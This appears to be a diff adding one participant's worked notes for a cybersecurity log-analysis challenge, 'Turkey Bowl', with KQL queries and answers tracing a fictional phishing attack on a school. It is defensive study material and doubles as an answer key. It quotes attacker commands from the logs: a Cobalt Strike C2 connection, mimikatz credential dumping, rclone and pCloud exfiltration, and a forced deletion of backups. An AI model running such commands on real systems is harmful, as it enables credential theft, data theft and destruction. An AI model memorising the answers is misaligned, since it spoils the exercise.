@@ -1,0 +1,738 @@
+﻿////////////////////Turkey Bowl
+
+search *
+| distinct $table
+
+1.2 
+
+Which column contains an authentication boolean?
+
+Employees
+| take 10
+
+mfa_enabled
+
+1.3
+
+Now that we have a better idea of the data we're working with, we should get a lay of the land.
+
+Let's get more information on Oxford Academy.
+
+How many employees (staff members and students) make up Oxford Academy?
+
+Employees
+| count
+//777
+
+1.4
+
+Which employee has the role of “Lead Coach”? (provide the name)
+
+Employees
+| where role == "Lead Coach"
+
+1/6/2024, 12:00:00 AM	Dill Delichick	Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.117 Safari/537.36	10.10.0.7	dill_delichick@go-oxford-owls.edu	didelichick	Lead Coach	WMNQ-LAPTOP	True	go-oxford-owls.edu
+
+/// Dill Delichick
+
+1.5
+
+Email
+| where recipient contains "dill_delichick@go-oxford-owls.edu"
+//15
+
+1.6
+
+How many Oxford employees received emails with the term "turkey" in the subject?
+
+Email
+| where subject contains "turkey"
+| where recipient contains "@go-oxford-owls.edu"
+| distinct recipient
+//553
+
+1.7
+
+How many unique websites did Patrick Stump visit?
+
+let A=
+Employees
+| where name contains "Patrick Stump"
+| distinct ip_addr;
+OutboundNetworkEvents
+| where src_ip has_any (A)
+| distinct url
+//34
+
+1.8
+
+How many distinct domains in the PassiveDns records contain the word "owls"?
+
+PassiveDns
+| where domain contains "owls"
+| distinct domain
+//5
+
+1.9
+
+There will be situations where you will want to view items using more than just one table. Let statements allow us to set a variable name equal to an expression or function. In the example below we'll see how we can compare multiple users that share the same name, but combine their results to get exactly what we're looking for.
+
+How many distinct URLs were browsed by employees with the first name Mary?
+
+let A=
+Employees
+| where name contains "Mary"
+| distinct ip_addr;
+OutboundNetworkEvents
+| where src_ip has_any (A)
+| distinct url
+///368
+
+1.10
+
+Type first down to start the investigation.
+
+//////////////////Section 2: This is gonna be a hoot! 🦉
+▸
+Question 1
+
+What is Tac Zaylor's email address?
+
+Employees
+| where name contains "Tac Zaylor"
+
+2/25/2022, 12:00:00 AM	Tac Zaylor	Mozilla/5.0 (Windows NT 6.2) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.185 Safari/537.36	10.10.0.13	tac_zaylor@go-oxford-owls.edu	tazaylor	Assistant Coach	FUXH-MACHINE	False	go-oxford-owls.edu
+
+//tac_zaylor@go-oxford-owls.edu
+//10.10.0.13
+
+2.3
+How many email were sent to Tac Zaylor from a go-oxford-owls.edu email?
+
+Email
+| where recipient contains "Zaylor"
+| where sender contains "go-oxford-owls.edu"
+| count //10
+
+How many of these emails came from those with a student role?
+
+let A=
+Email
+| where recipient contains "Zaylor"
+| where sender contains "go-oxford-owls.edu"
+| distinct sender;
+Employees
+| where email_addr has_any (A)
+| where role contains "student"
+///2 with student
+Brover Pham brover_pham@go-oxford-owls.edu
+Jerry Saunders jerry_saunders@go-oxford-owls.edu
+
+
+
+2.5
+
+Review the emails from these student accounts for the one sent on November 15, 2024 containing an inquiry for help from the assistant coach. 🏈
+
+What was the subject line of this email?
+
+Email
+| where recipient contains "Zaylor"
+| where sender contains "brover_pham@go-oxford-owls.edu"
+or sender contains "jerry_saunders@go-oxford-owls.edu"
+| where timestamp > datetime(2024-11-15)
+
+// Urgent Help Required: Coach, I need help accessing the playbook
+
+2.6
+
+This email does corroborate with the idea of the playbook possibly being tampered with.
+
+Who sent this email?
+
+//brover_pham@go-oxford-owls.edu
+
+2.7
+
+With our first lead, we should look deeper into the data on this student and ask the Oxford IT staff to ask the student what they know about the email in question.
+
+What is the device hostname used by this student?
+
+
+Employees
+| where email_addr contains "brover_pham@go-oxford-owls.edu"
+
+5/1/2021, 12:00:00 AM	Brover Pham	Mozilla/5.0 (compatible; MSIE 8.0; Windows NT 5.1; Trident/4.0)	10.10.0.2	brover_pham@go-oxford-owls.edu	brpham	Student	S1VX-MACHINE	False	go-oxford-owls.edu
+
+S1VX-MACHINE
+
+2.8
+What is the name of the file downloaded from the email?
+
+Email
+| where recipient contains "Zaylor"
+| where sender contains "brover_pham@go-oxford-owls.edu"
+| where timestamp > datetime(2024-11-15)
+
+['https://oxfordacademy-bestatfootball.com/download/Help_with_Playbook-Heres_What_I_tried.pdf']
+//Help_with_Playbook-Heres_What_I_tried.pdf
+
+2.9
+
+It looks like another staff member was targetted by the same email.
+
+Who is the other recipient? Enter their email address
+
+Email
+| where subject contains "[EXTERNAL] Urgent Help Required: Coach, I need help accessing the playbook"
+
+///dill_delichick@go-oxford-owls.edu WMNQ-LAPTOP
+
+Did the user found in Question 9 also download the file? yes/no
+didelichick
+
+let A=
+Employees
+| where username contains "didelichick"
+| distinct ip_addr;
+OutboundNetworkEvents
+| where src_ip has_any (A)
+| where url contains "Help_with_Playbook-Heres_What_I_tried.pdf"
+//no
+
+2.11
+
+When did Coach Zaylor download the aforementioned file from Question 7?
+
+Employees
+| where email_addr contains "brover_pham@go-oxford-owls.edu"
+
+info from the student 
+S1VX-MACHINE student 
+brover_pham@go-oxford-owls.edu	brpham	
+10.10.0.2
+
+
+FileCreationEvents
+| where username contains "tazaylor"
+| where path  contains "Help_with_Playbook-Heres_What_I_tried.pdf"
+
+C:\Users\tazaylor\Downloads\Help_with_Playbook-Heres_What_I_tried.pdf
+
+///2024-11-15T14:04:36.000Z
+
+2.12
+
+Shortly after Coach Zaylor downloaded the file, malicious content began executing.
+
+What is the name of the file created?
+
+FileCreationEvents
+| where username contains "tazaylor"
+| where timestamp >= datetime(2024-11-15T14:04:36.000Z)
+
+////disaintcobaltstrike.exe
+
+2.13
+
+A great way to learn more about suspicious files is to get their hash and perform a lookup on databases such as virustotal.com.
+
+What is the SHA256 of the file from question 12?
+
+FileCreationEvents
+| where username contains "tazaylor"
+| where filename contains "disaintcobaltstrike.exe"
+| project sha256
+
+///cdb82be1b9dd6391ed068124cfdf2339d71dd70f6f76462a7e4a0fdadd5a208a
+
+
+2.14
+
+What is the real name for this type of application that is widely used as a penetration testing tool?
+
+go to virtualtoal
+
+original name is :
+
+Cobalt Strike
+
+
+2.15
+
+It looks like an external connection has been established using this application.
+
+What is the IP being used for the C2 server (communication control)?
+
+external communication using the below files
+disaintcobaltstrike.exe
+
+ProcessEvents
+| where username contains "tazaylor"
+| where process_commandline contains "disaintcobaltstrike.exe"
+
+C:\ProgramData\disaintcobaltstrike.exe --connect 66.159.94.55:56789
+
+disaintcobaltstrike.exe play the same role as ssh
+
+IP : 66.159.94.55:56789
+
+2.16
+
+How many unique domains appear in PassiveDns using this IP address?
+
+PassiveDns
+| where ip contains "66.159.94.55"
+| distinct domain //4
+
+oxfordacademy-bestatfootball.com
+oxfordacademyfo0tball.com
+0xfordacademyf00tball.org
+oxfordacademyfutball.com
+
+2.17
+
+Fowl play is afoot…
+
+List any of the domains that appeared in Question 13.
+
+///oxfordacademy-bestatfootball.com
+
+
+2.18
+
+What is the term used for this type of attack being used by the attacker?
+
+//Website spoofing  creating a website that visually imitates a legitimate one.
+
+2.19
+
+How many inbound network events occured with the IP address mentioned in Question 12?
+
+InboundNetworkEvents
+| where src_ip  contains "66.159.94.55"
+//44
+
+2.20
+
+What is the referrer used by the IP address seen in Question 12 using an .edu TLD (top-level domain) not from Oxford Academy?
+
+InboundNetworkEvents
+| where src_ip  contains "66.159.94.55"
+| where referrer !contains "oxfordacademy" and referrer contains ".edu"
+| distinct referrer
+
+///https://intranet.sierravistahigh.edu
+
+
+2.21
+
+
+What is the URL of the referrer that is not using the .edu TLD?
+
+InboundNetworkEvents
+| where src_ip  contains "66.159.94.55"
+| where referrer !contains "oxfordacademy" and referrer !contains ".edu"
+| distinct referrer
+
+/// https://recon.grandtheftautumn.com
+
+Based on what we can see within the URL section, the attacker was gathering as much data as possible on Oxford Academy. The Cyber Kill Chain outlines the various stages of several common cyberattacks.
+
+Which step of the Cyber Kill Chain does this fall under?
+
+///Reconnaissance
+
+Section 3: Half-time
+▸
+Question 1
+
+Some commands were used to scan the network to gather information on the Oxford Academy network.
+
+What command did the attackers use first to perform their initial recon after gaining access to the Oxford network using Coach Tac Zaylor's credentials?
+
+ProcessEvents
+| where username contains "tazaylor"
+| where process_commandline !contains @"C:\"
+| distinct process_commandline
+
+////whoami
+
+3.2
+
+Within this set of commands, the attacker wanted to see information regarding the network status and protocol statistics.
+
+Which netstat flag did the attackers use?
+
+v
+| where process_commandline !contains @"C:\"
+| distinct process_commandline
+
+netstat -ano
+
+//-ano
+
+3.3
+
+After further investigation, it looks like another file was downloaded some time shortly after the malicious .pdf file was downloaded.
+
+What other file was downloaded besides the .pdf file?
+
+first file
+
+FileCreationEvents
+| where username contains "tazaylor"
+| where path  contains "Help_with_Playbook-Heres_What_I_tried.pdf"
+(2024-11-15T14:04:36.000Z)
+
+second file: 
+take the time and search what happend shortly
+
+FileCreationEvents
+| where username contains "tazaylor"
+| where timestamp >= datetime(2024-11-15T14:04:36.000Z)
+| where path  contains "download"
+
+
+//////Advanced_IP_Scanner_2.5.3850.exe
+
+3.4
+
+What URL did the attacker use to download that second file?
+
+OutboundNetworkEvents
+| where url   contains "Advanced_IP_Scanner_2.5.3850.exe"
+
+//https://0xfordacademyf00tball.org/tools/Advanced_IP_Scanner_2.5.3850.exe
+
+3.5
+It looks like multiple commands were ran with the application found in Question 3. 📋
+
+What is the name of the output file created?
+
+search *
+| distinct $table
+
+
+ProcessEvents
+| where process_commandline contains "Advanced_IP_Scanner"
+
+advanced_ip_scanner --scan --ip-range 192.168.1.0-192.168.1.255 --verbose --output C:\Users\tazaylor\Documents\network_scan.txt
+
+/// output : network_scan.txt
+
+3.6
+
+The attackers gathered information on the network and began the exploitation phase. Using the file generated from the previous question, the attackers found the cloud platform and began running tools to further exploiting the network. 🪪
+
+What tool did the attacker use to gain access to the cloud platform?
+
+first check the word cloud with the account compromised
+
+try 1
+
+ProcessEvents
+| where username contains "tazaylor"
+| where process_commandline contains "cloud"
+
+C:\Users\tazaylor\Downloads\pCloud.exe upload C:\Users\tazaylor\Documents\local_copy_of_playbook  --user GTA-fvreenivfgn --password ItsFallYall
+
+this executable is suspecious
+
+pCloud.exe
+
+info on the compromised employee
+10.10.0.13
+FUXH-MACHINE
+tazaylor
+
+try 2
+
+ProcessEvents
+| where process_commandline contains "Advanced_IP_Scanner"
+
+192.168.1.0-192.168.1.255
+output C:\Users\tazaylor\Documents\network_scan.txt
+10.0.0.0-10.0.0.255 
+
+network_scan
+
+
+ProcessEvents
+| where process_commandline contains "Cloud"
+
+
+OutboundNetworkEvents
+| where url contains "pCloud"
+
+https://helpcloud.com/products/download/services?q=08f91d57&token=99531f99&userid=eea16acc&sessionid=f38a7bc9
+https://gpcloudservice.com/media/products/products/services?sessionid=e1d5f74d&q=21633c5e&filter=2cff65d9&sort=eed3d005
+https://pcloud.com/pCloud.exe
+
+
+try 3 lets check password etc and user 
+
+ProcessEvents
+| where username contains "tazaylor"
+| where process_commandline contains "password"
+
+mimikatz.exe privilege::debug sekurlsa::logonpasswords
+
+///Response is :   mimikatz.exe  at  2024-11-27T15:29:46.000Z 
+
+
+3.7
+
+What is the password used to access the cloud platform?
+
+
+what happend after mimikatz exe from question 3.6
+
+FileCreationEvents
+| where username contains "tazaylor"
+| where timestamp >= datetime(2024-11-27T15:29:46.000Z)
+
+
+ProcessEvents
+| where username contains "tazaylor"
+| where timestamp >= datetime(2024-11-27T15:29:46.000Z)
+| distinct process_commandline
+
+net use \\footballshare\playbook 0wlsRdaBest3st /user:tazaylor
+
+/// the pass is  0wlsRdaBest3st
+
+3.8
+
+When did the attacker use the password to log into the cloud platform?
+
+ProcessEvents
+| where username contains "tazaylor"
+| where process_commandline contains "0wlsRdaBest3st"
+
+///  2024-11-27T15:30:11.000Z
+
+3.9
+
+A command was run to create copies of all files with the .docx, .pdf, and .xlxs extensions! 🧍🏽‍♀️🧍🏽‍♀️
+
+What is the name of the executable that was used perform this action on the files found in the network share?
+
+check what happend after 2024-11-27T15:30:11.000Z
+
+
+ProcessEvents
+| where username contains "tazaylor"
+| where timestamp >= datetime(2024-11-27T15:30:11.000Z)
+| distinct process_commandline
+
+C:\Users\tazaylor\Downloads\rclone.exe copy \\footballshare\playbook C:\Users\tazaylor\Documents\local_copy_of_playbook --include *.docx --include *.pdf --include *.xlsx
+
+//rclone.exe
+
+ProcessEvents
+| where username contains "tazaylor"
+| where process_commandline contains "copy"
+//| where timestamp >= datetime(2024-11-27T15:30:11.000Z)
+| distinct process_commandline
+
+
+3.10
+
+What was the command used to copy all of the files into one location?
+
+ProcessEvents
+| where username contains "tazaylor"
+| where timestamp >= datetime(2024-11-27T15:30:11.000Z)
+| project timestamp, process_commandline
+| order by timestamp asc
+
+ProcessEvents
+| where username contains "tazaylor"
+| where process_commandline contains "copy"
+//| where timestamp >= datetime(2024-11-27T15:30:11.000Z)
+| distinct process_commandline
+
+C:\Users\tazaylor\Downloads\rclone.exe copy \\footballshare\playbook C:\Users\tazaylor\Documents\local_copy_of_playbook --include *.docx --include *.pdf --include *.xlsx
+
+the answer is
+
+rclone.exe copy \\footballshare\playbook C:\Users\tazaylor\Documents\local_copy_of_playbook --include *.docx --include *.pdf --include *.xlsx
+
+
+3.11
+
+ProcessEvents
+| where username contains "tazaylor"
+| where process_commandline contains "copy"
+//| where timestamp >= datetime(2024-11-27T15:30:11.000Z)
+| distinct process_commandline
+
+C:\Users\tazaylor\Downloads\pCloud.exe upload C:\Users\tazaylor\Documents\local_copy_of_playbook  --user GTA-fvreenivfgn --password ItsFallYall
+
+///user:  GTA-fvreenivfgn
+
+
+3.12
+
+This username looks like its been encrypted with a cipher. Let's use tools available to us to determine their true identity! 🧩
+
+What is their real username after performing a decipher?
+
+user:  GTA-fvreenivfgn
+
+cyberchef with ROT13  use AI for that 
+
+response is 
+
+GTA-sierravista
+
+3.13
+
+
+What type of cipher was used?
+
+ROT13
+
+3.14
+
+What is the password the attacker used within their environment to log into their account?
+
+ProcessEvents
+| where username contains "tazaylor"
+| where process_commandline contains "copy"
+//| where timestamp >= datetime(2024-11-27T15:30:11.000Z)
+| distinct process_commandline
+
+
+C:\Users\tazaylor\Downloads\pCloud.exe upload C:\Users\tazaylor\Documents\local_copy_of_playbook  --user GTA-fvreenivfgn --password ItsFallYall
+
+password: ItsFallYall
+
+3.15
+
+
+From we can see, it looks like the attacker gained access to the cloud storage and began exfiltrating copies of all the documents they found onto their own cloud account.
+
+What is the MITRE ATT&CK ID of this attack?
+
+T1537
+
+ID: T1537
+Name: Transfer Data to Cloud Account
+Tactic: Exfiltration
+Description: Adversaries transfer data from a victim's cloud environment to another cloud account they control on the same service, often using built-in sharing, syncing, backup, or cloud APIs.
+
+
+3.16
+
+It looks like the attacker also downloaded a word file onto Coach Tac Zaylor's host machine. 📎
+
+What is the name of the file?
+
+ProcessEvents
+| where username contains "tazaylor"
+//| where src_ip  contains "10.10.0.13"
+| where process_commandline contains ".doc"
+
+///fake_plays.docx
+
+ren C:\Users\tazaylor\Documents\playbook\fake_plays.docx oxford_owls_winning_playbok.docx
+
+3.17
+
+What command was used on this file after it was downloaded onto the host machine?
+
+
+ren C:\Users\tazaylor\Documents\playbook\fake_plays.docx oxford_owls_winning_playbok.docx
+/// ren
+
+3.18
+
+
+What is the name of the file after using the previously mentioned command from Question 17?
+
+ren C:\Users\tazaylor\Documents\playbook\fake_plays.docx oxford_owls_winning_playbok.docx
+
+
+//oxford_owls_winning_playbok.docx
+
+3.19
+
+What directory did the attacker place this file in after performing the last action on it?
+
+
+ProcessEvents
+| where username contains "tazaylor"
+//| where src_ip  contains "10.10.0.13"
+| where process_commandline contains "oxford_owls_winning_playbok.docx"
+
+2024-11-27T15:38:15.000Z
+move C:\Users\tazaylor\Documents\playbook\oxford_owls_winning_playbok.docx C:\Playbooks\
+
+//Playbooks
+
+3.20
+
+Oh no! After performing a review, we can see that the archive server was wiped cleaned, deleting all backup files of the playbook! 🗑
+
+What was the command used to perform this action?
+
+ProcessEvents
+| where username contains "tazaylor"
+//| where src_ip  contains "10.10.0.13"
+| where process_commandline contains "Playbooks"
+
+2024-11-27T15:39:25.000Z
+del \\archive_server\football_team\playbooks /Q /F
+
+//del \\archive_server\football_team\playbooks /Q /F
+
+3.21
+
+What was the full name of the group that hacked Oxford Academy?
+
+InboundNetworkEvents
+| where url contains "Sierra" and url contains "vista" and url contains "oxford"
+| distinct url
+
+
+oxfordacademy-bestatfootball.com
+oxfordacademyfo0tball.com
+0xfordacademyf00tball.org
+oxfordacademyfutball.com
+
+going back to the question 
+
+ProcessEvents
+| where username contains "tazaylor"
+| where process_commandline contains "copy"
+//| where timestamp >= datetime(2024-11-27T15:30:11.000Z)
+| distinct process_commandline
+
+C:\Users\tazaylor\Downloads\pCloud.exe upload C:\Users\tazaylor\Documents\local_copy_of_playbook  --user GTA-fvreenivfgn --password ItsFallYall
+
+///user:  GTA-fvreenivfgn
+
+after decypher with ROT 13
+
+GTA-sierravista
+
+GTA:  grand theft autumn
+
+/// Rsponse grand theft autumn
+
+3.22
+
+attackers were from Sierra Vista High
+
+turkey bowl
+
+3.23
+
+Who was the APT that this story's adversary was based on?
+doing some intel
+
+Vice Society
+
+///
